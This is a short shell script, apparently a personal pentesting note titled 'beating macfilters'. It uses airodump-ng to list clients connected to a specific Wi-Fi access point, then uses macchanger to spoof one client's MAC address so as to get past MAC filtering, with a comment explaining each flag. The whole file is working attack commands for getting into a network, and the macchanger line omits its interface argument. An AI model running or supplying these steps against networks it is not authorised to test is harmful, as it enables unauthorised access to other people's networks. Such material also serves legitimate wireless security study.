#!/bin/sh

#-----------------------------------------------#
#	beating macfilters
#-----------------------------------------------#

# scan network bssid and note the attachted clients
airodump-ng -c 11 -a --bssid 00:21:91:D2:8E:25 mon0

# -c 11 = channel 11
# -a = only show clients associated and connected to the Access Point
# --bssid 00:21:91:D2:8E:25 = network bssid
# mon0 = monitor mode network interface


# spoof the mac address of a client attachted to the AP
macchanger -m 60:FB:42:D5:E4:01

# -m = spoofed mac address 